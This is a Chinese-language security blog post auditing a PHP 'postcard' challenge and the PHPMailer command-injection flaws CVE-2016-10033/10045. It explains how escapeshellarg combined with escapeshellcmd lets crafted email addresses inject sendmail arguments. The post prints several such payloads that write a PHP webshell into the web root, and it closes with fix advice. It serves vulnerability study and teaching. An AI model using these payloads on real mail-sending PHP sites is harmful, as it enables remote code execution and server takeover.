<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="postcard题目叫做明信片，代码如下：漏洞解析 ： 这道题其实是考察由 php 内置函数 mail 所引发的命令执行漏洞。我们先看看 php 自带的 mail 函数的用法： 1234567bool mail (	string $to ,	string $subject ,	string $message [,	string $additional_headers [,	string $addi">
<meta property="og:type" content="article">
<meta property="og:title" content="【代码审计】PHP代码审计2">
<meta property="og:url" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/index.html">
<meta property="og:site_name" content="g0dam">
<meta property="og:description" content="postcard题目叫做明信片，代码如下：漏洞解析 ： 这道题其实是考察由 php 内置函数 mail 所引发的命令执行漏洞。我们先看看 php 自带的 mail 函数的用法： 1234567bool mail (	string $to ,	string $subject ,	string $message [,	string $additional_headers [,	string $addi">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-1.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-2.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-3.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-4.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-5.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-6.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-7.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-8.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-9.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-10.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-11.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-12.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-13.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-14.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-15.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-16.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-17.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-18.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-19.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-20.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-21.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-22.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-23.png">
<meta property="og:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-24.png">
<meta property="article:published_time" content="2024-10-10T08:54:18.000Z">
<meta property="article:modified_time" content="2024-10-10T10:25:39.494Z">
<meta property="article:author" content="g0dam">
<meta property="article:tag" content="代码审计">
<meta property="article:tag" content="PHP">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/image.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>【代码审计】PHP代码审计2</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="g0dam" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/categories/">Categories</a></li><!--
     --><!--
       --><li><a href="/idea/">Idea</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/g0dam">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&text=【代码审计】PHP代码审计2"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&is_video=false&description=【代码审计】PHP代码审计2"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【代码审计】PHP代码审计2&body=Check out this article: https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&title=【代码审计】PHP代码审计2"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&name=【代码审计】PHP代码审计2&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://g0dam.github.io/2024/10/10/WebSecurity/codeaudit/phpaudit2/&t=【代码审计】PHP代码审计2"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#postcard"><span class="toc-number">1.</span> <span class="toc-text">postcard</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">实例分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-10045"><span class="toc-number">1.1.1.</span> <span class="toc-text">CVE-2016-10045</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-10045-1"><span class="toc-number">1.1.2.</span> <span class="toc-text">CVE-2016-10045</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">修复建议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE"><span class="toc-number">1.3.</span> <span class="toc-text">题目</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98payload%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">解题payload：</span></a></li></ol></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【代码审计】PHP代码审计2
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">g0dam</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2024-10-10T08:54:18.000Z" class="dt-published" itemprop="datePublished">2024-10-10</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Web-Security/">Web Security</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="postcard"><a href="#postcard" class="headerlink" title="postcard"></a>postcard</h2><p>题目叫做明信片，代码如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image.png"><br><strong>漏洞解析</strong> ：</p>
<p>这道题其实是考察由 <strong>php</strong> 内置函数 <strong>mail</strong> 所引发的命令执行漏洞。我们先看看 <strong>php</strong> 自带的 <strong>mail</strong> 函数的用法：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">bool</span> <span class="title function_ invoke__">mail</span> (</span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$to</span> ,</span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$subject</span> ,</span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$message</span> [,</span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$additional_headers</span> [,</span><br><span class="line">	<span class="keyword">string</span> <span class="variable">$additional_parameters</span> ]]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>其参数含义分别表示如下：</p>
<blockquote>
<ul>
<li>to，指定邮件接收者，即接收人</li>
<li>subject，邮件的标题</li>
<li>message，邮件的正文内容</li>
<li>additional_headers，指定邮件发送时其他的额外头部，如发送者From，抄送CC，隐藏抄送BCC</li>
<li>additional_parameters，指定传递给发送程序sendmail的额外参数。</li>
</ul>
</blockquote>
<p>在Linux系统上， <strong>php</strong> 的 <strong>mail</strong> 函数在底层中已经写好了，默认调用 <strong>Linux</strong> 的 <strong><a target="_blank" rel="noopener" href="http://www.sendmail.com/">sendmail</a></strong> 程序发送邮件。而在额外参数( <strong>additional_parameters</strong> )中， <strong>sendmail</strong> 主要支持的选项有以下三种：</p>
<blockquote>
<ul>
<li><p>-O option &#x3D; value</p>
<p>QueueDirectory &#x3D; queuedir 选择队列消息</p>
</li>
<li><p>-X logfile</p>
<p>这个参数可以指定一个目录来记录发送邮件时的详细日志情况。</p>
</li>
<li><p>-f from email</p>
<p>这个参数可以让我们指定我们发送邮件的邮箱地址。</p>
</li>
</ul>
</blockquote>
<p>举个简单例子方便理解: </p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-1.png"></p>
<p>上面这个样例中，我们使用 <strong>-X</strong> 参数指定日志文件，最终会在 <strong>&#x2F;var&#x2F;www&#x2F;html&#x2F;rce.php</strong> 中写入如下数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">17220</span> &lt;&lt;&lt; To: Alice@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; Subject: Hello Alice!</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; X-PHP-Originating-Script: <span class="number">0</span>:test.php</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; CC: somebodyelse@example.com</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt;</span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; <span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>(); <span class="meta">?&gt;</span></span><br><span class="line"> <span class="number">17220</span> &lt;&lt;&lt; [EOF]</span><br></pre></td></tr></table></figure>

<p>当然这题如果只是这一个问题的话，会显的太简单了，我们继续往下看，在 <strong>第3行</strong> 有这样一串代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">filter_var</span>(<span class="variable">$email</span>, FILTER_VALIDATE_EMAIL)</span><br></pre></td></tr></table></figure>

<p>这串代码的主要作用，是确保在第5个参数中只使用有效的电子邮件地址 <strong>$email</strong> 。我们先了解一下 <strong>filter_var()</strong> 函数的定义：</p>
<blockquote>
<p><strong><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.filter-var.php">filter_var</a></strong> ：使用特定的过滤器过滤一个变量</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed filter_var ( mixed $variable [, int $filter = FILTER_DEFAULT [, mixed $options ]] )</span><br></pre></td></tr></table></figure>

<p><strong>功能</strong> ：这里主要是根据第二个参数filter过滤一些想要过滤的东西。</p>
</blockquote>
<p>关于 <strong>filter_var()</strong> 中 <strong>FILTER_VALIDATE_EMAIL</strong> 这个选项作用，我们可以看看这个帖子 <a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/19220158/php-filter-validate-email-does-not-work-correctly">PHP FILTER_VALIDATE_EMAIL</a> 。这里面有个结论引起了我的注意： <strong>none of the special characters in this local part are allowed outside quotation marks</strong> ，表示所有的特殊符号必须放在双引号中。 <strong>filter_var()</strong> 问题在于，我们在双引号中嵌套转义空格仍然能够通过检测。同时由于底层正则表达式的原因，我们通过重叠单引号和双引号，欺骗 <strong>filter_val()</strong> 使其认为我们仍然在双引号中，这样我们就可以绕过检测。下面举个简单的例子，方便理解：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-2.png"></p>
<p>当然由于引入的特殊符号，虽然绕过了 <strong>filter_var()</strong> 针对邮箱的检测，但是由于PHP的 <strong>mail()</strong> 函数在底层实现中，调用了 <strong>escapeshellcmd()</strong> 函数，对用户输入的邮箱地址进行检测，导致即使存在特殊符号，也会被 <strong>escapeshellcmd()</strong> 函数处理转义，这样就没办法达到命令执行的目的了。 <strong>escapeshellcmd()</strong> 函数在底层代码如下（详细点 <a target="_blank" rel="noopener" href="https://github.com/php/php-src/blob/PHP-5.6.29/ext/standard/mail.c">这里</a> ）：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-3.png"><br>因此我们继续往下看，在第七行有这样一串代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$email</span>);</span><br></pre></td></tr></table></figure>

<p>这句代码主要是处理 <strong>$email</strong> 传入的数据。我们先来看一下 <strong>escapeshellarg</strong> 函数的定义：</p>
<blockquote>
<p><strong><a target="_blank" rel="noopener" href="http://php.net/manual/zh/function.escapeshellarg.php">escapeshellarg</a></strong> — 把字符串转码为可以在 shell 命令里使用的参数</p>
<p><strong>功能</strong> ：escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，shell 函数包含 exec()，system() 执行运算符(反引号)</p>
<p><strong>定义</strong> ：<code>string escapeshellarg ( string $arg )</code></p>
</blockquote>
<p>具体功能作用，可以参考如下案例：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-4.png"><br>那我们前面说过了PHP的 <strong>mail()</strong> 函数在底层调用了 <strong>escapeshellcmd()</strong> 函数对用户输入的邮箱地址进行处理，即使我们使用带有特殊字符的payload，绕过 <strong>filter_var()</strong> 的检测，但还是会被 <strong>escapeshellcmd()</strong> 处理。然而 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg</strong> 一起使用，会造成特殊字符逃逸，下面我们给个简单例子理解一下：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-5.png"></p>
<p>详细分析一下这个过程：</p>
<ol>
<li><p>传入的参数是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1&#x27; -v -d a=1</span><br></pre></td></tr></table></figure>
</li>
<li><p>由于<code>escapeshellarg</code>先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。所以处理之后的效果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\&#x27;&#x27; -v -d a=1&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>接着 <code>escapeshellcmd</code> 函数对第二步处理后字符串中的 <code>\</code> 以及 <code>a=1&#39;</code> 中的单引号进行转义处理，结果如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;127.0.0.1&#x27;\\&#x27;&#x27; -v -d a=1\&#x27;</span><br></pre></td></tr></table></figure>
</li>
<li><p>由于第三步处理之后的payload中的 <code>\\</code> 被解释成了 <code>\</code> 而不再是转义字符，所以单引号配对连接之后将payload分割为三个部分，具体如下所示：</p>
</li>
</ol>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-6.png"></p>
<p>所以这个payload可以简化为 <code>curl 127.0.0.1\ -v -d a=1&#39;</code> ，即向 <code>127.0.0.1\</code> 发起请求，POST 数据为 <code>a=1&#39;</code> 。</p>
<p>总结一下，这题实际上是考察绕过 <strong>filter_var()</strong> 函数的邮件名检测，通过 <strong>mail</strong> 函数底层实现中调用的 <strong>escapeshellcmd()</strong> 函数处理字符串，再结合 <strong>escapeshellarg()</strong> 函数，最终实现参数逃逸，导致 <strong>远程代码执行</strong> 。</p>
<h3 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h3><p>这里实例分析选择 <strong>PHPMailer 命令执行漏洞</strong> （  <strong>CVE-2016-10045</strong> 和 <strong>CVE-2016-10033</strong> ）。项目代码可以通过以下方式下载：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/PHPMailer/PHPMailer</span><br><span class="line"><span class="built_in">cd</span> PHPMailer</span><br><span class="line">git checkout -b CVE-2016-10033 v5.2.17</span><br></pre></td></tr></table></figure>
<h4 id="CVE-2016-10045"><a href="#CVE-2016-10045" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h4><p>漏洞原理</p>
<p>在github上直接diff一下，对比一下不同版本的 <strong><a target="_blank" rel="noopener" href="https://github.com/PHPMailer/PHPMailer/compare/v5.2.17...v5.2.18#diff-ace81e501931d8763b49f2410cf3094d">class.phpmailer.php</a></strong> 文件，差异如下：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-7.png"></p>
<p>这里在 <strong>sendmailSend</strong> 函数中加了 <strong>validateAddress</strong> 函数，来针对发送的数据进行判断，判断邮箱地址的合法性。另外针对传入的数据，调用了 <strong>escapeshellarg</strong> 函数来转义特殊符号，防止注入参数。然而这样做，就引入了我们上面讨论的问题，即同时使用 <strong>escapeshellarg</strong> 函数和 <strong>escapeshellcmd()</strong> 函数，导致单引号逃逸。由于程序没有对传命令参数的地方进行转义，所以我们可以结合 <strong>mail</strong> 函数的第五个参数 <strong>-X</strong> 写入 <strong>webshell</strong> 。</p>
<p>下面详细看一下代码，漏洞具体位置在 <strong>class.phpmailer.php</strong> 中，我们截取部分相关代码如下 ：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-8.png"></p>
<p>在上图第12行处没有对 <strong>$params</strong> 变量进行严格过滤，只是简单地判断是否为 <strong>null</strong> ，所以可以直接传入命令。我们继续往下看，我们发现在上图第12行，当 <strong>safe_mode</strong> 模式处于关闭状态时， <strong>mail()</strong> 函数才会传入 <strong>$params</strong> 变量。<br>进一步跟跟进 <strong>$params</strong> 参数，看看它是怎么来的。这个参数的位置在 <strong>class.phpmailer.php</strong> 中，我们截取部分相关代码，具体看下图 <strong>第11行</strong> ： </p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-9.png"></p>
<p>很明显 <strong>$params</strong> 是从 <strong>$this-&gt;Sender</strong> 传进来的，我们找一下 <strong>$this-&gt;Sender</strong> ，发现这个函数在 <strong>class.phpmailer.php</strong> 中，截取部分相关代码，具体看下图 <strong>第10行</strong> ：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-10.png"></p>
<p>这里在 <strong>setFrom</strong> 函数中将 <strong>$address</strong> 经过某些处理之后赋值给 <strong>$this-&gt;Sender</strong> 。我们详细看看 <strong>$address</strong> 变量是如何处理的。主要处理函数均在 <strong>class.phpmailer.php</strong> 文件中，我们截取了部分相关代码，在下图 <strong>第三行</strong> 中使用了 <strong>validateAddress</strong> 来处理 <strong>$address</strong> 变量。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-11.png"></p>
<p>所以跟进一下 <strong>validateAddress</strong> 函数，这个函数位置在 <strong>class.phpmailer.php</strong> 文件中。我们看看程序流程，相关代码如下：</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-12.png"></p>
<p>分析一下这段代码，大概意思就是对环境进行了判断，如果没有 <strong>prce</strong> 并且 <strong>php</strong> 版本 <strong>&lt;5.2.0</strong> ，则 <strong>$patternselect &#x3D; ‘noregex’</strong> 。接着往下看，在 <strong>class.phpmailer.php</strong> 文件中，有部分关于 <strong>$patternselect</strong> 的 <strong>swich</strong> 操作，我只选择了我们需要的那个，跟踪到下面的 <strong>noregex</strong> 。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-13.png"></p>
<p>这里简单的只是根据 <strong>@</strong> 符号来处理字符，所以这里的payload很简单。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure>

<p>然后通过 <strong>linux</strong> 自身的 <strong>sendmail</strong> 写log的方式，把log写到web根目录下。将日志文件后缀定义为 <strong>.php</strong> ，即可成功写入webshell。</p>
<h4 id="CVE-2016-10045-1"><a href="#CVE-2016-10045-1" class="headerlink" title="CVE-2016-10045"></a>CVE-2016-10045</h4><p>diff一下5.2.20和5.2.18发现针对 <strong>escapeshellcmd</strong> 和 <strong>escapeshellarg</strong> 做了改动。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-14.png"></p>
<p>这里其实有个很奇妙的漏洞，针对用户输入使用 <strong>escapeshellarg</strong> 函数进行处理。所以，在最新版本中使用之前的 payload 进行攻击会失败，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure>

<p>但是，却可以使用下面这个  <strong>payload</strong> 进行攻击：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;( -OQueueDirectory=/tmp -X/var/www/html/x.php )@a.com</span><br></pre></td></tr></table></figure>

<p>实际上，可用于攻击的代码只是在之前的基础上多了一个单引号。之所以这次的攻击代码能够成功，是因为修复代码多了  <strong>escapeshellcmd</strong> 函数，结合上 <strong>mail()</strong> 函数底层调用的 <strong>escapeshellarg</strong> 函数，最终导致单引号逃逸。</p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-15.png"></p>
<p>我们的 <strong>payload</strong> 最终在执行时变成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;-fa&#x27;\\&#x27;&#x27;\( -OQueueDirectory=/tmp -X/var/www/html/test.php \)@a.com\&#x27;</span><br></pre></td></tr></table></figure>

<p>按照刚才上面的分析，我们将payload化简分割一下就是<code>-fa\(</code>、<code>-OQueueDirectory=/tmp</code>、<code>-X/var/www/html/test.php</code>、<code>)@a.com&#39;</code>，这四个部分。最终的参数就是这样被注入的。</p>
<p>漏洞利用</p>
<p>漏洞有一些基本要求：<br><strong>1、php version &lt; 5.2.0</strong><br><strong>2、phpmailer &lt; 5.2.18</strong><br><strong>3、php 没有安装 pcre（no default）</strong><br><strong>4、safe_mode &#x3D; false（default）</strong></p>
<p>存在正则绕过之后，以及 <strong>escapeshellarg</strong>  和 <strong>escapeshellcmd</strong> 一起使用造成的神奇现象之后。</p>
<p>只需要 <strong>phpmailer &lt; 5.2.20</strong> </p>
<p><strong><a target="_blank" rel="noopener" href="https://github.com/opsxcq/exploit-CVE-2016-10033">环境，poc，exp相关</a></strong></p>
<p><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-16.png"></p>
<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>我们来看一下 <strong>PHPMailer</strong> 官方给出的修复代码。官方对用户传入的参数进行检测，如果当中存在被转义的字符，则不传递 <strong>-f</strong> 参数（**-f** 参数表示发邮件的人，如果不传递该参数，我们的payload就不会被带入 <strong>mail</strong> 函数，也就不会造成命令执行），所以不建议大家同时使用 <strong>escapeshellcmd()</strong> 和 <strong>escapeshellarg()</strong> 函数对参数进行过滤，具体修复代码如下：<br><img src="/2024/10/10/WebSecurity/codeaudit/phpaudit2/image-17.png"></p>
